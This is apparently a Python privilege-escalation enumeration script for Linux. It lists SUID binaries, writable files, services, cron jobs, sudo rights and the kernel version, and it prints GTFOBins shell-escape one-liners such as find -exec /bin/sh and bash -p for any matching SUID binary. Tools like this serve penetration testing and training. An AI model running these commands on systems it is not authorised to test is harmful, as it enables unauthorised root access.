#!/usr/bin/env python3
import subprocess

def run(cmd):
    return subprocess.getoutput(cmd)

# -------- COLORS --------
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
END = "\033[0m"

print("\n" + "="*70)
print("   Linux Privilege Escalation Automation Toolkit")
print("="*70 + "\n")

# ---------- USER INFO ----------
print(GREEN + "[+] User Information:" + END)
print("User ->", run("whoami"))
print("ID   ->", run("id"))

# ---------- SUID ----------
print("\n" + GREEN + "[1] SUID Binary Check:" + END)

suid_files = run("find / -perm -4000 2>/dev/null").split("\n")

interesting = ["find","awk","perl","python","ruby","vim","less","more",
               "nmap","bash","sh","cp","mv","tar","zip","env"]

for f in suid_files:
    if any(i in f for i in interesting):
        print(RED + "[HIGH RISK] " + f + END)
    else:
        print(f)

# ---------- GTFOBins ----------
print("\n" + GREEN + "[+] GTFOBins Exploits:" + END)

gtfobins = {
    "find": "find . -exec /bin/sh \\; -quit",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "python": "python -c 'import os; os.system(\"/bin/sh\")'",
    "vim": ":!sh",
    "less": "!/bin/sh",
    "bash": "bash -p"
}

for f in suid_files:
    for key in gtfobins:
        if key in f:
            print(RED + f"[EXPLOIT] {f}" + END)
            print("  ->", gtfobins[key])

# ---------- WRITABLE FILES ----------
print("\n" + GREEN + "[2] Writable Files:" + END)
print(run("find / -writable -type f 2>/dev/null | grep -v '/proc' | head -20"))

# ---------- WRITABLE DIRECTORIES ----------
print("\n" + GREEN + "[+] Writable Directories:" + END)
dirs = run("find / -type d -perm -002 2>/dev/null | head -20")
if dirs:
    print(RED + dirs + END)

# ---------- WRITABLE ROOT FILES ----------
print("\n" + GREEN + "[+] Writable Root Files:" + END)
root_files = run("find / -user root -perm -002 2>/dev/null | head -20").split("\n")

for f in root_files:
    if f:
        print(RED + f"[HIGH RISK] {f}" + END)

# ---------- WRITABLE BINARIES ----------
print("\n" + GREEN + "[+] Writable Executables:" + END)
bins = run("find / -type f -executable -writable 2>/dev/null | head -10")
if bins:
    print(RED + bins + END)

# ---------- SERVICE FILES ----------
print("\n" + GREEN + "[+] Writable Service Files:" + END)
service_files = run("find /etc/systemd/system -type f 2>/dev/null").split("\n")

for svc in service_files:
    if svc:
        perm = run(f"ls -l {svc}")
        if "w" in perm:
            print(RED + f"[HIGH RISK] {svc}" + END)

# ---------- PATH HIJACK ----------
print("\n" + GREEN + "[+] PATH Hijacking Check:" + END)
paths = run("echo $PATH").split(":")

for p in paths:
    perm = run(f"ls -ld {p} 2>/dev/null")
    if "w" in perm:
        print(RED + f"[HIGH RISK] Writable PATH -> {p}" + END)

# ---------- FILE PERMISSIONS ----------
print("\n" + GREEN + "[3] Sensitive File Permissions:" + END)
print("passwd ->", run("ls -l /etc/passwd"))
print("shadow ->", run("ls -l /etc/shadow"))

# ---------- CRON ----------
print("\n" + GREEN + "[4] Cron Analysis:" + END)

cron = run("cat /etc/crontab 2>/dev/null")
print(cron)

print("\n" + GREEN + "[+] Cron Vulnerabilities:" + END)

for line in cron.split("\n"):
    if line.strip() and not line.startswith("#"):
        parts = line.split()
        if len(parts) >= 7:
            user = parts[5]
            cmd = parts[6]

            print(f"[INFO] {user} -> {cmd}")

            if user == "root":
                print(RED + f"[HIGH RISK] Runs as root -> {cmd}" + END)

                perm = run(f"ls -l {cmd} 2>/dev/null")
                if "w" in perm:
                    print(RED + f"[!!!] Writable cron script -> {cmd}" + END)

                if "/" not in cmd:
                    print(YELLOW + f"[WARNING] Relative path -> {cmd}" + END)

                dir_path = run(f"dirname {cmd}")
                dir_perm = run(f"ls -ld {dir_path} 2>/dev/null")

                if "w" in dir_perm:
                    print(YELLOW + f"[WARNING] Writable dir -> {dir_path}" + END)

# ---------- SUDO ----------
print("\n" + GREEN + "[5] Sudo Permissions:" + END)

sudo = run("sudo -n -l 2>/dev/null")

if sudo:
    print(sudo)

    if "NOPASSWD" in sudo:
        print(RED + "[HIGH RISK] NOPASSWD detected" + END)

    dangerous = ["vim","less","nano","awk","find","perl","python"]

    for d in dangerous:
        if d in sudo:
            print(RED + f"[HIGH RISK] Exploitable sudo binary -> {d}" + END)
else:
    print("No sudo access")

# ---------- SERVICES ----------
print("\n" + GREEN + "[6] Running Services:" + END)
print(run("systemctl list-units --type=service --state=running | head -10"))

# ---------- KERNEL ----------
print("\n" + GREEN + "[7] Kernel Version:" + END)
kernel = run("uname -r")
print(kernel)

if kernel.startswith(("3.", "4.")):
    print(RED + "[WARNING] Old kernel -> possible exploits" + END)

print("\n" + "="*70)
print("              SCAN COMPLETE")
print("="*70 + "\n")
